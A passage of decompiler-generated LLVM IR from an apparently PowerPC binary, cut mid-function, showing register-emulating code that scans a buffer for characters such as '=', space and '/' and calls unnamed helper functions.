  %v5_10000f84 = call i32 @function_1000ac30(i32 %v2_10000f74, i32 %v2_10000f7c, i32 ptrtoint ([3 x i8]* @global_var_1000de34.24 to i32), i32 2)
  store i32 %v5_10000f84, i32* %r3.global-to-local, align 4
  %v1_10000f88 = icmp slt i32 %v5_10000f84, -1
  %v2_10000f88 = icmp sgt i32 %v5_10000f84, -1
  %v3_10000f88 = icmp eq i32 %v5_10000f84, -1
  store i1 %v1_10000f88, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000f88, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000f88, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000f88, label %dec_label_pc_10000fbc, label %dec_label_pc_10000f90

dec_label_pc_10000f90:                            ; preds = %dec_label_pc_10000f38
  %v1_10000f90 = icmp slt i32 %v5_10000f84, 1
  %v2_10000f90 = icmp sgt i32 %v5_10000f84, 1
  %v3_10000f90 = icmp eq i32 %v5_10000f84, 1
  store i1 %v1_10000f90, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000f90, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000f90, i1* %cr7_eq.global-to-local, align 1
  %tmp76 = icmp slt i32 %v5_10000f84, 2
  br i1 %tmp76, label %dec_label_pc_10000f9c, label %dec_label_pc_10000f98

dec_label_pc_10000f98:                            ; preds = %dec_label_pc_10000f90
  %v1_10000f98 = add i32 %v5_10000f84, -2
  store i32 %v1_10000f98, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10000f9c

dec_label_pc_10000f9c:                            ; preds = %dec_label_pc_10000f90, %dec_label_pc_10000f98
  %v1_10000fa4 = phi i32 [ %v5_10000f84, %dec_label_pc_10000f90 ], [ %v1_10000f98, %dec_label_pc_10000f98 ]
  %v0_10000f9c = load i32, i32* %r18.global-to-local, align 4
  %v1_10000f9c = load i32, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10000f9c = add i32 %v0_10000f9c, %v1_10000fa4
  %v2_10000fa4 = add i32 %v2_10000f9c, %v1_10000f9c
  store i32 %v2_10000fa4, i32* %r9.global-to-local, align 4
  store i32 10, i32* %r4.global-to-local, align 4
  %v3_10000fac = add i32 %v2_10000fa4, 10532
  %v4_10000fac = inttoptr i32 %v3_10000fac to i8*
  store i8 0, i8* %v4_10000fac, align 1
  %v0_10000fb0 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10000fb0, i32* @r3, align 4
  store i32 268439480, i32* @lr, align 4
  %v2_10000fb4 = call i32 @function_1000ac8c(i32 %v0_10000fb0, i32 10)
  store i32 %v2_10000fb4, i32* %r3.global-to-local, align 4
  %v1_10000fb8 = load i32, i32* @r30, align 4
  %v2_10000fb8 = add i32 %v1_10000fb8, 931
  %v3_10000fb8 = inttoptr i32 %v2_10000fb8 to i32*
  store i32 %v2_10000fb4, i32* %v3_10000fb8, align 4
  br label %dec_label_pc_10000fbc

dec_label_pc_10000fbc:                            ; preds = %dec_label_pc_10000f38, %dec_label_pc_10001770, %dec_label_pc_10000f9c
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 39, i32* %r3.global-to-local, align 4
  %v0_10000fc8 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10000fc8, i32* %r31.global-to-local, align 4
  store i32 268439504, i32* %lr.global-to-local, align 4
  %v3_10000fcc = call i32 @function_1000a238(i32 39, i32* null)
  %v0_10000fd0 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000fd0, i32* %r4.global-to-local, align 4
  %v0_10000fd8 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10000fd8, i32* %r3.global-to-local, align 4
  store i32 268439520, i32* %lr.global-to-local, align 4
  %v3_10000fdc = inttoptr i32 %v0_10000fd8 to i8*
  %v4_10000fdc = call i32 @function_1000af14(i8* %v3_10000fdc, i32 %v0_10000fd0, i32 %v3_10000fcc)
  store i32 %v4_10000fdc, i32* %r3.global-to-local, align 4
  %v1_10000fe0 = icmp slt i32 %v4_10000fdc, -1
  %v2_10000fe0 = icmp sgt i32 %v4_10000fdc, -1
  %v3_10000fe0 = icmp eq i32 %v4_10000fdc, -1
  store i1 %v1_10000fe0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000fe0, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000fe0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000fe0, label %dec_label_pc_1000111c, label %dec_label_pc_10000fe8

dec_label_pc_10000fe8:                            ; preds = %dec_label_pc_10000fbc, %dec_label_pc_100010f4
  %v0_10000fe8 = load i32, i32* @r30, align 4
  %v1_10000fe8 = add i32 %v0_10000fe8, 935
  %v2_10000fe8 = inttoptr i32 %v1_10000fe8 to i32*
  %v3_10000fe8 = load i32, i32* %v2_10000fe8, align 4
  store i32 %v3_10000fe8, i32* %r0.global-to-local, align 4
  %v1_10000fec = icmp slt i32 %v3_10000fe8, 4
  %v2_10000fec = icmp sgt i32 %v3_10000fe8, 4
  %v3_10000fec = icmp eq i32 %v3_10000fe8, 4
  store i1 %v1_10000fec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000fec, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000fec, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10000fec, label %dec_label_pc_1000111c, label %dec_label_pc_10000ff4

dec_label_pc_10000ff4:                            ; preds = %dec_label_pc_10000fe8
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 39, i32* %r3.global-to-local, align 4
  store i32 268439552, i32* %lr.global-to-local, align 4
  %v3_10000ffc = call i32 @function_1000a238(i32 39, i32* null)
  %v0_10001000 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10001000, i32* %r4.global-to-local, align 4
  %v0_10001008 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10001008, i32* %r3.global-to-local, align 4
  store i32 268439568, i32* %lr.global-to-local, align 4
  %v3_1000100c = inttoptr i32 %v0_10001008 to i8*
  %v4_1000100c = call i32 @function_1000af14(i8* %v3_1000100c, i32 %v0_10001000, i32 %v3_10000ffc)
  store i32 %v4_1000100c, i32* %r3.global-to-local, align 4
  %v0_10001010 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001010 = add i32 %v0_10001010, %v4_1000100c
  store i32 %v2_10001010, i32* %r26.global-to-local, align 4
  %v0_10001014 = load i32, i32* %r18.global-to-local, align 4
  %v2_10001014 = add i32 %v0_10001014, %v2_10001010
  store i32 %v2_10001014, i32* %r9.global-to-local, align 4
  %v1_10001018 = add i32 %v2_10001014, 10532
  %v2_10001018 = inttoptr i32 %v1_10001018 to i8*
  %v3_10001018 = load i8, i8* %v2_10001018, align 1
  %v4_10001018 = zext i8 %v3_10001018 to i32
  store i32 %v4_10001018, i32* %r0.global-to-local, align 4
  %v1_1000101c = icmp ult i8 %v3_10001018, 32
  %v2_1000101c = icmp ugt i8 %v3_10001018, 32
  %v3_1000101c = icmp eq i8 %v3_10001018, 32
  store i1 %v1_1000101c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000101c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000101c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000101c, label %dec_label_pc_1000124c, label %dec_label_pc_10001024

dec_label_pc_10001024:                            ; preds = %dec_label_pc_10000ff4, %dec_label_pc_1000124c
  %v0_1000102c = phi i32 [ %v4_1000100c, %dec_label_pc_10000ff4 ], [ %v1_1000124c, %dec_label_pc_1000124c ]
  %v1_10001024 = load i32, i32* %r24.global-to-local, align 4
  %v2_10001024 = sub i32 %v1_10001024, %v0_10001010
  store i32 %v2_10001024, i32* %r0.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v2_1000102c = sub i32 %v2_10001024, %v0_1000102c
  store i32 %v2_1000102c, i32* %r27.global-to-local, align 4
  %v0_10001030 = load i32, i32* %r31.global-to-local, align 4
  %v2_10001030 = add i32 %v0_10001030, %v0_1000102c
  store i32 %v2_10001030, i32* %r29.global-to-local, align 4
  store i32 %v2_10001030, i32* %r3.global-to-local, align 4
  store i32 %v2_1000102c, i32* %r4.global-to-local, align 4
  store i32 268439624, i32* %lr.global-to-local, align 4
  %v5_10001044 = call i32 @function_1000ac30(i32 %v2_10001030, i32 %v2_1000102c, i32 ptrtoint ([3 x i8]* @global_var_1000de34.24 to i32), i32 2)
  store i32 %v5_10001044, i32* %r3.global-to-local, align 4
  %v1_10001048 = icmp slt i32 %v5_10001044, -1
  %v2_10001048 = icmp sgt i32 %v5_10001044, -1
  %v3_10001048 = icmp eq i32 %v5_10001044, -1
  store i1 %v1_10001048, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001048, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001048, i1* %cr7_eq.global-to-local, align 1
  store i32 %v5_10001044, i32* %r31.global-to-local, align 4
  br i1 %v3_10001048, label %dec_label_pc_100010f0, label %dec_label_pc_10001054

dec_label_pc_10001054:                            ; preds = %dec_label_pc_10001024
  %v1_10001054 = icmp slt i32 %v5_10001044, 1
  %v2_10001054 = icmp sgt i32 %v5_10001044, 1
  %v3_10001054 = icmp eq i32 %v5_10001044, 1
  store i1 %v1_10001054, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001054, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001054, i1* %cr7_eq.global-to-local, align 1
  %v0_10001058 = load i32, i32* %r20.global-to-local, align 4
  %v1_10001058 = load i32, i32* %r26.global-to-local, align 4
  %v2_10001058 = add i32 %v1_10001058, %v0_10001058
  store i32 %v2_10001058, i32* %r28.global-to-local, align 4
  %tmp77 = icmp slt i32 %v5_10001044, 2
  br i1 %tmp77, label %dec_label_pc_10001064, label %dec_label_pc_10001060

dec_label_pc_10001060:                            ; preds = %dec_label_pc_10001054
  %v1_10001060 = add i32 %v5_10001044, -2
  store i32 %v1_10001060, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10001064

dec_label_pc_10001064:                            ; preds = %dec_label_pc_10001054, %dec_label_pc_10001060
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v0_10001068 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10001068, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000de60.39 to i32), i32* %r25.global-to-local, align 4
  %v0_10001070 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10001070, i32* %r4.global-to-local, align 4
  store i32 268439680, i32* %lr.global-to-local, align 4
  %v4_1000107c = call i32 @function_1000ac30(i32 %v0_10001068, i32 %v0_10001070, i32 ptrtoint (i32* @global_var_1000de60.39 to i32), i32 1)
  store i32 %v4_1000107c, i32* %r3.global-to-local, align 4
  %v1_10001080 = icmp slt i32 %v4_1000107c, 0
  %v2_10001080 = icmp sgt i32 %v4_1000107c, 0
  %v3_10001080 = icmp eq i32 %v4_1000107c, 0
  store i1 %v1_10001080, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001080, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001080, i1* %cr7_eq.global-to-local, align 1
  %tmp78 = icmp slt i32 %v4_1000107c, 1
  br i1 %tmp78, label %dec_label_pc_10001064.dec_label_pc_100010a0_crit_edge, label %dec_label_pc_10001088

dec_label_pc_10001064.dec_label_pc_100010a0_crit_edge: ; preds = %dec_label_pc_10001064
  %v1_100010a0.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100010a0

dec_label_pc_10001088:                            ; preds = %dec_label_pc_10001064
  %v0_10001088 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10001088, i32* %r3.global-to-local, align 4
  %v0_1000108c = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_1000108c, i32* %r4.global-to-local, align 4
  %v0_10001090 = load i32, i32* %r25.global-to-local, align 4
  store i32 268439708, i32* %lr.global-to-local, align 4
  %v4_10001098 = call i32 @function_1000ac30(i32 %v0_10001088, i32 %v0_1000108c, i32 %v0_10001090, i32 1)
  store i32 %v4_10001098, i32* %r3.global-to-local, align 4
  %v1_1000109c = add i32 %v4_10001098, -1
  store i32 %v1_1000109c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100010a0

dec_label_pc_100010a0:                            ; preds = %dec_label_pc_10001064.dec_label_pc_100010a0_crit_edge, %dec_label_pc_10001088
  %v1_100010a0 = phi i32 [ %v1_100010a0.pre, %dec_label_pc_10001064.dec_label_pc_100010a0_crit_edge ], [ %v1_1000109c, %dec_label_pc_10001088 ]
  %v0_100010a0 = load i32, i32* %r18.global-to-local, align 4
  %v2_100010a0 = add i32 %v0_100010a0, %v1_100010a0
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_100010a8 = load i32, i32* %r26.global-to-local, align 4
  %v2_100010a8 = add i32 %v2_100010a0, %v1_100010a8
  store i32 %v2_100010a8, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_100010b0 = add i32 %v2_100010a8, 10532
  %v4_100010b0 = inttoptr i32 %v3_100010b0 to i8*
  store i8 0, i8* %v4_100010b0, align 1
  %v0_100010b4 = load i32, i32* %r11.global-to-local, align 4
  %v1_100010b4 = load i32, i32* @r1, align 4
  %v2_100010b4 = add i32 %v1_100010b4, 8
  %v3_100010b4 = inttoptr i32 %v2_100010b4 to i32*
  store i32 %v0_100010b4, i32* %v3_100010b4, align 4
  br label %dec_label_pc_100010d0

dec_label_pc_100010bc:                            ; preds = %dec_label_pc_100010d0
  br i1 %v3_100010c0, label %dec_label_pc_100011f0, label %dec_label_pc_100010c8

dec_label_pc_100010c8:                            ; preds = %dec_label_pc_100010bc
  %v1_100010c8 = add i32 %v3_100010d8, 1
  store i32 %v1_100010c8, i32* %r11.global-to-local, align 4
  store i32 %v1_100010c8, i32* %v2_100010d8, align 4
  br label %dec_label_pc_100010d0

dec_label_pc_100010d0:                            ; preds = %dec_label_pc_100010a0, %dec_label_pc_100010c8
  %v0_100010d0 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100010d0, i32* %r3.global-to-local, align 4
  store i32 268439768, i32* @lr, align 4
  %v1_100010d4 = inttoptr i32 %v0_100010d0 to i8*
  %v2_100010d4 = call i32 @function_1000ab64(i8* %v1_100010d4)
  store i32 %v2_100010d4, i32* %r3.global-to-local, align 4
  %v0_100010d8 = load i32, i32* @r1, align 4
  %v1_100010d8 = add i32 %v0_100010d8, 8
  %v2_100010d8 = inttoptr i32 %v1_100010d8 to i32*
  %v3_100010d8 = load i32, i32* %v2_100010d8, align 4
  store i32 %v3_100010d8, i32* %r29.global-to-local, align 4
  %v2_100010dc = icmp slt i32 %v2_100010d4, %v3_100010d8
  %v3_100010dc = icmp sgt i32 %v2_100010d4, %v3_100010d8
  %v4_100010dc = icmp eq i32 %v2_100010d4, %v3_100010d8
  store i1 %v2_100010dc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100010dc, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_100010dc, i1* %cr7_eq.global-to-local, align 1
  %v0_100010bc = load i32, i32* %r28.global-to-local, align 4
  %v2_100010bc = add i32 %v0_100010bc, %v3_100010d8
  %v3_100010bc = inttoptr i32 %v2_100010bc to i8*
  %v4_100010bc = load i8, i8* %v3_100010bc, align 1
  %v5_100010bc = zext i8 %v4_100010bc to i32
  store i32 %v5_100010bc, i32* %r0.global-to-local, align 4
  %v1_100010c0 = icmp ult i8 %v4_100010bc, 61
  %v2_100010c0 = icmp ugt i8 %v4_100010bc, 61
  %v3_100010c0 = icmp eq i8 %v4_100010bc, 61
  store i1 %v1_100010c0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100010c0, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100010c0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100010dc, label %dec_label_pc_100010bc, label %dec_label_pc_100010e4

dec_label_pc_100010e4:                            ; preds = %dec_label_pc_100010d0
  br i1 %v3_100010c0, label %dec_label_pc_100011f0, label %dec_label_pc_100010f0

dec_label_pc_100010f0:                            ; preds = %dec_label_pc_10001228, %dec_label_pc_10001258, %dec_label_pc_100010e4, %dec_label_pc_10001024
  %v0_100010f0 = load i32, i32* %r26.global-to-local, align 4
  store i32 %v0_100010f0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100010f4

dec_label_pc_100010f4:                            ; preds = %dec_label_pc_10001268, %dec_label_pc_100010f0
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 39, i32* %r3.global-to-local, align 4
  store i32 268439808, i32* %lr.global-to-local, align 4
  %v3_100010fc = call i32 @function_1000a238(i32 39, i32* null)
  %v0_10001100 = load i32, i32* %r20.global-to-local, align 4
  %v1_10001100 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001100 = add i32 %v1_10001100, %v0_10001100
  store i32 %v2_10001100, i32* %r31.global-to-local, align 4
  %v0_10001108 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10001108, i32* %r4.global-to-local, align 4
  store i32 %v2_10001100, i32* %r3.global-to-local, align 4
  store i32 268439828, i32* %lr.global-to-local, align 4
  %v3_10001110 = inttoptr i32 %v2_10001100 to i8*
  %v4_10001110 = call i32 @function_1000af14(i8* %v3_10001110, i32 %v0_10001108, i32 %v3_100010fc)
  store i32 %v4_10001110, i32* %r3.global-to-local, align 4
  %v1_10001114 = icmp slt i32 %v4_10001110, -1
  %v2_10001114 = icmp sgt i32 %v4_10001110, -1
  %v3_10001114 = icmp eq i32 %v4_10001110, -1
  store i1 %v1_10001114, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001114, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001114, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001114, label %dec_label_pc_1000111c, label %dec_label_pc_10000fe8

dec_label_pc_1000111c:                            ; preds = %dec_label_pc_100010f4, %dec_label_pc_10000fe8, %dec_label_pc_10000fbc
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 38, i32* %r3.global-to-local, align 4
  store i32 268439848, i32* %lr.global-to-local, align 4
  %v3_10001124 = call i32 @function_1000a238(i32 38, i32* null)
  %v0_10001128 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10001128, i32* %r4.global-to-local, align 4
  %v0_10001130 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10001130, i32* %r3.global-to-local, align 4
  store i32 268439864, i32* %lr.global-to-local, align 4
  %v3_10001134 = inttoptr i32 %v0_10001130 to i8*
  %v4_10001134 = call i32 @function_1000af14(i8* %v3_10001134, i32 %v0_10001128, i32 %v3_10001124)
  store i32 %v4_10001134, i32* %r3.global-to-local, align 4
  %v1_10001138 = icmp slt i32 %v4_10001134, -1
  %v2_10001138 = icmp sgt i32 %v4_10001134, -1
  %v3_10001138 = icmp eq i32 %v4_10001134, -1
  store i1 %v1_10001138, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001138, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001138, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001138, label %dec_label_pc_10001574, label %dec_label_pc_10001140

dec_label_pc_10001140:                            ; preds = %dec_label_pc_1000111c
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 38, i32* %r3.global-to-local, align 4
  store i32 268439884, i32* %lr.global-to-local, align 4
  %v3_10001148 = call i32 @function_1000a238(i32 38, i32* null)
  %v0_1000114c = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_1000114c, i32* %r4.global-to-local, align 4
  %v0_10001154 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10001154, i32* %r3.global-to-local, align 4
  store i32 268439900, i32* %lr.global-to-local, align 4
  %v3_10001158 = inttoptr i32 %v0_10001154 to i8*
  %v4_10001158 = call i32 @function_1000af14(i8* %v3_10001158, i32 %v0_1000114c, i32 %v3_10001148)
  store i32 %v4_10001158, i32* %r3.global-to-local, align 4
  %v0_10001160 = load i32, i32* %r18.global-to-local, align 4
  %v2_10001160 = add i32 %v0_10001160, %v4_10001158
  store i32 %v2_10001160, i32* %r9.global-to-local, align 4
  %v1_10001164 = add i32 %v2_10001160, 10532
  %v2_10001164 = inttoptr i32 %v1_10001164 to i8*
  %v3_10001164 = load i8, i8* %v2_10001164, align 1
  %v4_10001164 = zext i8 %v3_10001164 to i32
  store i32 %v4_10001164, i32* %r0.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v1_10001170 = xor i32 %v4_10001164, 32
  %v1_10001174 = sub nsw i32 0, %v1_10001170
  %v2_10001174 = xor i32 %v4_10001164, -33
  %v4_10001174 = icmp uge i32 %v2_10001174, %v1_10001174
  %v2_10001178 = zext i1 %v4_10001174 to i32
  %v3_10001178 = add i32 %v2_10001178, %v4_10001158
  store i32 %v3_10001178, i32* %r11.global-to-local, align 4
  %v0_1000117c = load i32, i32* %r20.global-to-local, align 4
  %v2_1000117c = add i32 %v3_10001178, %v0_1000117c
  store i32 %v2_1000117c, i32* %r29.global-to-local, align 4
  store i32 %v2_1000117c, i32* %r3.global-to-local, align 4
  %v1_10001184 = load i32, i32* %r24.global-to-local, align 4
  %v2_10001184 = sub i32 %v1_10001184, %v3_10001178
  store i32 %v2_10001184, i32* %r4.global-to-local, align 4
  store i32 %v3_10001178, i32* @r31, align 4
  store i32 268439952, i32* %lr.global-to-local, align 4
  %v5_1000118c = call i32 @function_1000ac30(i32 %v2_1000117c, i32 %v2_10001184, i32 ptrtoint ([3 x i8]* @global_var_1000de34.24 to i32), i32 2)
  store i32 %v5_1000118c, i32* %r3.global-to-local, align 4
  %v1_10001190 = icmp slt i32 %v5_1000118c, -1
  %v2_10001190 = icmp sgt i32 %v5_1000118c, -1
  %v3_10001190 = icmp eq i32 %v5_1000118c, -1
  store i1 %v1_10001190, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001190, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001190, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001190, label %dec_label_pc_10001574, label %dec_label_pc_10001198

dec_label_pc_10001198:                            ; preds = %dec_label_pc_10001140
  %v1_10001198 = icmp slt i32 %v5_1000118c, 1
  %v2_10001198 = icmp sgt i32 %v5_1000118c, 1
  %v3_10001198 = icmp eq i32 %v5_1000118c, 1
  store i1 %v1_10001198, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001198, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001198, i1* %cr7_eq.global-to-local, align 1
  %tmp79 = icmp slt i32 %v5_1000118c, 2
  br i1 %tmp79, label %dec_label_pc_100011a4, label %dec_label_pc_100011a0

dec_label_pc_100011a0:                            ; preds = %dec_label_pc_10001198
  %v1_100011a0 = add i32 %v5_1000118c, -2
  store i32 %v1_100011a0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100011a4

dec_label_pc_100011a4:                            ; preds = %dec_label_pc_10001198, %dec_label_pc_100011a0
  %v1_100011ac = phi i32 [ %v5_1000118c, %dec_label_pc_10001198 ], [ %v1_100011a0, %dec_label_pc_100011a0 ]
  %v0_100011a4 = load i32, i32* %r18.global-to-local, align 4
  %v1_100011a4 = load i32, i32* @r31, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_100011a4 = add i32 %v0_100011a4, %v1_100011ac
  %v2_100011ac = add i32 %v2_100011a4, %v1_100011a4
  store i32 %v2_100011ac, i32* %r9.global-to-local, align 4
  %v1_100011b0 = add i32 %v1_100011ac, 1
  store i32 %v1_100011b0, i32* %r28.global-to-local, align 4
  store i32 268500992, i32* %r11.global-to-local, align 4
  %v3_100011b8 = add i32 %v2_100011ac, 10532
  %v4_100011b8 = inttoptr i32 %v3_100011b8 to i8*
  store i8 0, i8* %v4_100011b8, align 1
  %v0_100011bc = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_100011bc, i32* %r3.global-to-local, align 4
  %v0_100011c0 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100011c0, i32* %r4.global-to-local, align 4
  store i32 268440016, i32* %lr.global-to-local, align 4
  %v5_100011cc = call i32 @function_1000ac30(i32 %v0_100011bc, i32 %v0_100011c0, i32 ptrtoint ([5 x i8]* @global_var_1000de64.40 to i32), i32 4)
  store i32 %v5_100011cc, i32* %r3.global-to-local, align 4
  %v1_100011d0 = icmp slt i32 %v5_100011cc, 4
  %v2_100011d0 = icmp sgt i32 %v5_100011cc, 4
  %v3_100011d0 = icmp eq i32 %v5_100011cc, 4
  store i1 %v1_100011d0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100011d0, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100011d0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100011d0, label %dec_label_pc_100017fc, label %dec_label_pc_100011d8

dec_label_pc_100011d8:                            ; preds = %dec_label_pc_100011a4
  %v0_100011d8 = load i32, i32* %r20.global-to-local, align 4
  %v1_100011d8 = load i32, i32* @r31, align 4
  %v2_100011d8 = add i32 %v1_100011d8, %v0_100011d8
  %v3_100011d8 = inttoptr i32 %v2_100011d8 to i8*
  %v4_100011d8 = load i8, i8* %v3_100011d8, align 1
  %v5_100011d8 = zext i8 %v4_100011d8 to i32
  store i32 %v5_100011d8, i32* %r0.global-to-local, align 4
  %v1_100011dc = icmp ult i8 %v4_100011d8, 47
  %v2_100011dc = icmp ugt i8 %v4_100011d8, 47
  %v3_100011dc = icmp eq i8 %v4_100011d8, 47
  store i1 %v1_100011dc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100011dc, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100011dc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100011dc, label %dec_label_pc_10001a1c, label %dec_label_pc_100011e4

dec_label_pc_100011e4:                            ; preds = %dec_label_pc_10001350, %dec_label_pc_1000190c, %dec_label_pc_100018b4, %dec_label_pc_1000189c, %dec_label_pc_100011d8, %dec_label_pc_10001a40, %dec_label_pc_10001a1c, %dec_label_pc_100018d8
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_100011e8 = load i32, i32* @r30, align 4
  %v3_100011e8 = add i32 %v2_100011e8, -529
  %v4_100011e8 = inttoptr i32 %v3_100011e8 to i8*
  store i8 1, i8* %v4_100011e8, align 1
  br label %dec_label_pc_10000824

dec_label_pc_100011f0:                            ; preds = %dec_label_pc_100010bc, %dec_label_pc_100010e4
  %v0_100011f0 = load i32, i32* @r30, align 4
  %v1_100011f0 = add i32 %v0_100011f0, 935
  %v2_100011f0 = inttoptr i32 %v1_100011f0 to i32*
  %v3_100011f0 = load i32, i32* %v2_100011f0, align 4
  store i32 %v3_100011f0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 0, i32* %v2_100010d8, align 4
  %v0_100011fc = load i32, i32* %r0.global-to-local, align 4
  %v1_100011fc = icmp slt i32 %v0_100011fc, 0
  %v2_100011fc = icmp sgt i32 %v0_100011fc, 0
  %v3_100011fc = icmp eq i32 %v0_100011fc, 0
  store i1 %v1_100011fc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100011fc, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100011fc, i1* %cr7_eq.global-to-local, align 1
  %tmp80 = icmp slt i32 %v0_100011fc, 1
  br i1 %tmp80, label %dec_label_pc_10001258, label %dec_label_pc_10001204

dec_label_pc_10001204:                            ; preds = %dec_label_pc_100011f0
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10001228

dec_label_pc_1000120c:                            ; preds = %dec_label_pc_10001228
  %v0_1000120c = load i32, i32* @r1, align 4
  %v1_1000120c = add i32 %v0_1000120c, 8
  %v2_1000120c = inttoptr i32 %v1_1000120c to i32*
  %v3_1000120c = load i32, i32* %v2_1000120c, align 4
  store i32 %v3_1000120c, i32* %r9.global-to-local, align 4
  %v0_10001210 = load i32, i32* @r30, align 4
  %v1_10001210 = add i32 %v0_10001210, 935
  %v2_10001210 = inttoptr i32 %v1_10001210 to i32*
  %v3_10001210 = load i32, i32* %v2_10001210, align 4
  store i32 %v3_10001210, i32* %r0.global-to-local, align 4
  %v1_10001214 = add i32 %v3_1000120c, 1
  store i32 %v1_10001214, i32* %r11.global-to-local, align 4
  %v2_10001218 = icmp slt i32 %v3_10001210, %v1_10001214
  %v3_10001218 = icmp sgt i32 %v3_10001210, %v1_10001214
  %v4_10001218 = icmp eq i32 %v3_10001210, %v1_10001214
  store i1 %v2_10001218, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001218, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_10001218, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10001214, i32* %r4.global-to-local, align 4
  store i32 %v1_10001214, i32* %v2_1000120c, align 4
  br i1 %v3_10001218, label %dec_label_pc_1000120c.dec_label_pc_10001228_crit_edge, label %dec_label_pc_10001258

dec_label_pc_1000120c.dec_label_pc_10001228_crit_edge: ; preds = %dec_label_pc_1000120c
  %v0_10001228.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10001228

dec_label_pc_10001228:                            ; preds = %dec_label_pc_1000120c.dec_label_pc_10001228_crit_edge, %dec_label_pc_10001204
  %v0_10001228 = phi i32 [ %v0_10001228.pre, %dec_label_pc_1000120c.dec_label_pc_10001228_crit_edge ], [ 0, %dec_label_pc_10001204 ]
  %v1_10001228 = mul i32 %v0_10001228, 128
  %v0_1000122c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000122c, i32* %r3.global-to-local, align 4
